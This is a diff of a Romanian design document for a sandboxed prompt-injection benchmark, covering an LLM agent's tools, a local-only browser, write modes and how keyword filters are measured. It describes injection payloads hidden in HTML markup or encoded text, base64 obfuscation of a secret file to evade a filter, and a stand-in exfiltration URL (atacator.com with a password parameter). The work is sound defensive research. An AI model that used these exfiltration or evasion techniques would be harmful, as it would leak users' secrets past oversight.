@@ -34,7 +34,7 @@ spatele lor.
 | 8 | `delete_email` | gata | mail |
 | 9 | `calculator` | gata | calcul |
 | 10 | `run_command` | gata | terminal |
-| 11 | `browser` | **de facut** | web |
+| 11 | `browser` | gata | web |
 
 Fiecare unealta noua trebuie sincronizata in **patru** locuri: functia in
 `tools.py`, intrarea in `REGISTRY`, schema in `config/tools.yaml`, si - daca are
@@ -181,8 +181,31 @@ deci fiecare cuvant e platit de `max_steps` ori pe rulare.
 Perechea `list_files` + `read_file` e tiparul de baza: una afla ce exista,
 cealalta citeste un lucru anume.
 
-`write_file` **inlocuieste complet** continutul, nu adauga la final. Descrierea o
-spune explicit, pentru ca numele singur nu o face evidenta.
+`write_file` are parametrul `mode`, cu doua valori (`enum` in schema, ca modelul
+sa nu poata inventa o a treia):
+
+| `mode` | Ce face | Fisier inexistent |
+|---|---|---|
+| `write` (implicit) | inlocuieste **complet** continutul, nu adauga la final | il creeaza |
+| `append` | pastreaza continutul si adauga la finalul lui | il creeaza |
+
+Descrierea din YAML spune explicit ca `write` inlocuieste tot, pentru ca numele
+uneltei singur nu o face evidenta.
+
+**De ce un parametru si nu un append prin read + write.** Varianta "citeste tot,
+adauga, rescrie" ar fi cerut doi pasi de model, iar intre ei modelul ar fi tinut
+tot continutul vechi in context si l-ar fi retrimis. La un fisier mare umple
+contextul; iar daca modelul greseste o singura data la recopiere (taie,
+parafrazeaza, omite o linie), **suprascrie fisierul cu o versiune corupta**.
+Un append devenit "rescrie din memorie" e mult mai fragil.
+
+Cu `mode`, Python deschide fisierul in `"a"` si sistemul de operare garanteaza
+ca scrierea ajunge la sfarsit - un singur apel, atomic.
+
+**Si conteaza pentru masuratoare:** intentia devine vizibila in argument. Filtrul
+lui Mihai poate trata diferit "adauga" de "suprascrie tot". Cu read + write, un
+payload "adauga linia X" si un payload "sterge tot si scrie X" ar fi ajuns la
+aceeasi unealta cu aceeasi forma, imposibil de distins.
 
 ### 4.2 Mail: fluxul inbox
 
@@ -393,95 +416,83 @@ executie. Un `cp` prin shell n-ar putea fi verificat.
   environment fals.
 - Nu exista timeout. Comenzile din set sunt toate rapide, dar `subprocess.run`
   asteapta la nesfarsit daca un proces se blocheaza.
-- `cp`/`mv` scriu in outbox si files, deci `reset_sandbox()` care nu restaureaza
-  din template devine si mai critic: o rulare care muta fisiere le lasa mutate
-  pentru urmatoarea.
 - Descrierea din `tools.yaml` e cea mai lunga (enumerarea comenzilor e
   inevitabila). Prima de scurtat daca latenta strange.
 
-### 4.6 Web: `browser` (neimplementat)
+### 4.6 Web: `browser`
 
-**Decizie amanata deliberat.** Intrebarea de fond - citeste unealta URL-uri reale
-sau doar pagini locale? - o discut cu echipa la intalnirea de luni 14
-septembrie, inainte de implementare. Mai jos sunt argumentele stranse pana acum
-si punctele deja clarificate, ca discutia sa porneasca de undeva.
+Citeste o pagina web din folderul de lucru si intoarce continutul ei complet, cu
+tot codul HTML.
 
-#### Intrebarea de decis impreuna: URL-uri reale sau nu
+#### Ce primeste: doar fisiere `.html`
 
-Argumentul **pentru** retea reala e utilitatea: task-urile benigne devin
-realiste. "Zi-mi ultima stire de la Ziarul Financiar" e genul de sarcina pe care
-un agent adevarat o primeste, si masuram utilitatea unui agent real, nu a unuia
-de jucarie.
+Decis la intalnirea din 14 septembrie. Browserul **nu citeste URL-uri** - primeste
+numele unui fisier `.html` din `sandbox/files/`. Cand sarcina spune "acceseaza
+site-ul X" sau "compara paginile", e vorba tot despre fisiere locale.
 
-Argumentele **impotriva**, toate legate de pasii urmatori din plan:
+Citirea de URL-uri reale se poate implementa usor, dar ar fi stricat testele:
 
-**Verificatorul devine imposibil (pasul 3).** Fiecare din cele 25 de sarcini
-normale are nevoie de un verificator automat care spune reusit sau nu. Pentru
-"ultima stire" nu poti hardcoda raspunsul corect - se schimba in fiecare ora.
-Fara raspuns corect nu exista verificator, deci task-ul nu poate intra in suita.
+**Verificatorul devine imposibil.** Fiecare sarcina benigna are nevoie de un
+verificator automat. Pentru "zi-mi ultima stire de la Ziarul Financiar" nu poti
+hardcoda raspunsul corect - se schimba in fiecare ora.
 
-**Pasul 4 devine zgomot.** Rulam aceleasi 25 de sarcini cu fiecare politica si
-comparam. Daca intre rulari continutul s-a schimbat, diferenta masurata nu mai e
-"utilitate pierduta din cauza filtrului", ci variatie din lume.
+**Comparatia intre politici devine zgomot.** Rulam aceleasi sarcini cu fiecare
+politica si comparam. Daca intre rulari continutul s-a schimbat, diferenta
+masurata nu mai e "utilitate pierduta din cauza filtrului", ci variatie din lume.
 
 **Retea = canal de exfiltrare real.** Un payload injectat poate cere
 `https://atacator.com/?date=PAROLA`. Unealta ar face cererea, datele ar pleca
-efectiv de pe masina. Mai rau: verificatorul lui Robert se uita in outbox, unde
-nu apare nimic - deci ar fi o scurgere reala, invizibila pentru masuratoare.
-Acelasi motiv pentru care `run_command` foloseste `cp`/`mv` in loc de `curl`.
+efectiv de pe masina. Mai rau: verificatorul se uita in outbox, unde nu apare
+nimic - o scurgere reala, invizibila pentru masuratoare. Acelasi motiv pentru
+care `run_command` foloseste `cp`/`mv` in loc de `curl`.
 
 **Robert nu poate planta payload** pe un site care nu e al nostru. Contractul
-cere `payload` plantat in `target_name`, deci cele 3 atacuri `webpage` ar ramane
-fara suport.
+cere `payload` plantat in `target_name`.
 
-**Latenta retelei polueaza pasul 5.**
+#### Unde stau paginile: `files/`
 
-#### Varianta propusa: snapshot-uri locale
+In `sandbox/files/`, langa `basic_webpage_bad.html`, `basic_webpage_good.html`,
+`developer_webpage.html` care existau deja. Astfel atacurile `webpage` ale lui
+Robert nu au trebuit mutate.
 
-Compromisul care pastreaza utilitatea fara costurile de mai sus: luam paginile
-reale **o singura data**, le salvam ca `.html`, si browserul citeste local.
-Continut autentic, markup autentic, dar fix.
-
-Realismul vine din *continutul* paginilor, nu din faptul ca sunt live. Pentru ce
-masuram - cat de usor e pacalit agentul de continutul pe care il citeste - nu
-conteaza daca pagina e de azi sau de saptamana trecuta. Snapshot-ul e si practica
-standard in lucrarile din domeniu, tocmai ca rezultatele sa poata fi verificate
-de altii.
-
-De discutat daca varianta asta acopera suficient nevoia de utilitate, sau daca
-echipa vrea totusi si o ruta catre retea.
-
-#### Ce e deja clarificat
-
-Indiferent de decizia despre URL-uri, urmatoarele raman:
-
-**Unde stau paginile: `sandbox/files/`.** Langa `basic_webpage_bad.html`,
-`basic_webpage_good.html`, `developer_webpage.html` care exista deja, astfel
-incat atacurile `webpage` ale lui Robert sa nu trebuiasca mutate.
 *Limitare acceptata:* `read_file` poate citi aceleasi fisiere, deci exista doua
-rute catre acelasi continut, ceea ce face traseele din `trace.jsonl` mai greu de
-interpretat. Alternativa era `sandbox/web/`, respinsa ca sa nu-si rescrie Robert
-atacurile.
+rute catre acelasi continut. Separarea nu e tehnica, ci semantica: se face prin
+**descrierea din YAML**, formulata pe limbaj web ("vizitarea, deschiderea sau
+analizarea unui site, a unei pagini web sau a unui webpage"), ca modelul sa aleaga
+`browser` cand sarcina suna a navigare. Fara asta, unealta ar exista dar nu s-ar
+declansa niciodata, si atacurile `webpage` ar merge tot prin `read_file`.
 
-**Ce intoarce: HTML brut**, cu markup cu tot - tag-uri, comentarii, elemente
-ascunse. Un browser real ar arata doar textul vizibil, dar daca filtram
-`<!-- comentarii -->` sau `<div style="display:none">`, omoram categoria
-`hidden_markup` - atacurile care ascund payload in markup. Ar fi o aparare
-construita in unealta (sectiunea 3.1). Din acelasi motiv, eventualele
-snapshot-uri se salveaza brute, fara curatare prealabila.
+Verificarea `.html` intareste separarea: `read_file` citeste orice, `browser` doar
+pagini.
 
-**Pagina inexistenta:** mesaj in limbaj web ("pagina nu a putut fi accesata"), nu
-de filesystem. Un browser real da 404, nu "fisierul nu exista".
+#### Ce intoarce: HTML brut
 
-**Validarea caii:** un URL poate contine `../` sau forme encodate (`%2e%2e`). Se
-**decodeaza intai**, apoi trece prin `_safe`. Fara decodare, `_safe` vede un
-string inofensiv si il lasa sa treaca.
+Continutul **cu markup cu tot** - tag-uri, comentarii, elemente ascunse.
 
-**Trunchierea - deschis, depinde de Robert.** O pagina reala poate avea sute de
-KB; fara limita, un apel umple contextul. Dar daca taiem la N caractere si
-payload-ul e la sfarsitul paginii, atacul **nu poate reusi niciodata** si apare
-ca `success = 0` - un zero fals care face apararea sa para mai buna decat e. De
-aflat de la Robert: lungimea payload-urilor si unde sunt plantate in pagina.
+Un browser real ar arata doar textul vizibil, dar daca am filtra
+`<!-- comentarii -->` sau `<div style="display:none">`, am omori categoria
+`hidden_markup` - atacurile care ascund payload in markup (A003, A017). Ar fi o
+aparare construita in unealta (sectiunea 3.1).
+
+#### Mesajele
+
+Doua clase, si in interiorul fiecareia nu se poate distinge nimic:
+
+| Situatie | Mesaj |
+|---|---|
+| nu se termina in `.html` (orice fisier, inclusiv o cale din afara sandbox-ului) | "Pagina ceruta nu a putut fi accesata. Nu este in format .html" |
+| pagina inexistenta **sau** cale blocata de zid | `INVALID_NAME` |
+
+Verificarea extensiei e **inaintea** lui `_safe`, deci o cale de traversare fara
+`.html` nici nu atinge discul si primeste acelasi mesaj ca un `.txt` obisnuit. Iar
+cu `.html`, `FileNotFoundError` si `SandboxEscapeError` cad amandoua pe
+`INVALID_NAME` - identic byte cu byte.
+
+Mesajul despre `.html` e legitim dupa regula din 5.1: vorbeste despre **greseala
+modelului**, nu despre masina. Si e util - modelul se poate corecta singur.
+
+`browser` e in `LIST_TOOL`, deci la `INVALID_NAME` primeste si sufixul cu
+`list_files`, ca sa poata afla numele corect al paginii.
 
 ---
 
@@ -653,28 +664,30 @@ doar cand `base` corespunde.
 
 ### Pentru Mihai
 
-- **`policy()` - semnatura.** `agent.py` cheama `policy(task, name, args)`;
-  README-ul ii cere `allow(user_goal, tool_call, permissions)`. Nu se potrivesc.
-  Cand isi conecteaza filtrul, crapa.
-- **`policy()` - exceptii.** Daca arunca, darama tot `run()`. Nedecis.
-- **`reset_sandbox()` nu restaureaza din template.** Cu `write_file`,
-  `delete_file` si acum `cp`/`mv`, o rulare lasa sandbox-ul modificat pentru
-  urmatoarea. Nu crapa - doar da rezultate gresite, tacut. Cel mai periculos de pe
-  lista.
-- **Suprascrierea la `write_file`.** Poate corupe logica benigna, in functie de
-  cum functioneaza policy-ul cand agentului i se cere sa suprascrie complet un
-  fisier. Il oprim? Atentionam utilizatorul? Daca da, cum se ia decizia ulterioara
-  in policy?
-- **`delete_email` si `llm_judge`** - cum distinge intre atac ("sterge
-  `cerere_in_casatorie.txt` din inbox") si task benign ("goleste SPAM-ul")? Vezi
-  4.4.
+- **`policy()` - semnatura, de confirmat.** `load_policy` din `harness.py` face
+  `getattr(policies, name)`, deci `--policy keyword` incarca functia
+  `policies.keyword`. Semnatura pe care o cheama `agent.py` este
+  `policy(task, name, args) -> bool`. Asta trebuie respectata in `policies.py`.
+- **`policy()` - exceptii.** Daca arunca, darama tot `run()`. Nedecis, si conteaza:
+  o rulare completa dureaza zeci de minute, deci o exceptie la atacul 20 din 25
+  sterge si rezultatele de dinainte.
+- **`write_file` cu `mode`.** Filtrul poate acum distinge `append` de `write`
+  (4.1). De decis daca suprascrierea completa se trateaza diferit de adaugare -
+  distinctia exista in argument, ramane sa fie folosita.
 
 ### Pentru Robert
 
 - **Conventia de prefix.** Uneltele accepta `files/` si `inbox/` exact in forma
   asta. Daca scrie altfel undeva (`sandbox/files/x`, sau fara prefix), se rupe.
-- **Lungimea payload-urilor** si unde sunt plantate in pagina - necesare pentru
-  alegerea trunchierii la `browser` si la `read_file`.
+- **Unealta `base64` nu are consumator.** Toate atacurile `encoded` (A007, A011,
+  A015, A017, A021, A023) folosesc hex, binar sau HTML entities, si niciunul nu
+  atinge uneltele: payload-ul e decodat de model in context, nu de o unealta.
+  `run_command("base64 <fisier>")` acopera ofuscarea la **iesire** (encodezi un
+  fisier secret inainte sa-l trimiti, ca filtrul pe cuvinte sa nu-l recunoasca) -
+  ar avea nevoie de un atac scris special pentru ea.
+- **A021 foloseste HTML entities dar e `placed_in: email`.** Entitatile se
+  decodeaza intr-un browser, nu intr-un client de email text. Nu strica nimic,
+  dar ca tehnica s-ar potrivi mai bine pe `webpage`.
 - **Co-proiectarea perechii benign/atac** pentru `delete_email` (4.4).
 
 ### De discutat impreuna
@@ -692,4 +705,4 @@ doar cand `base` corespunde.
   blocheaza `delete_file` si ar exista si `rm`, un atac ar merge pe langa. E un
   rezultat publicabil despre fragilitatea allowlist-urilor de unelte. Zero
   suprapunere e mai curat si mai usor de aparat - dar o singura suprapunere
-  deliberata ar da un experiment in plus.
+  deliberata ar da un experiment in plus. (**De adaugat in future work**)
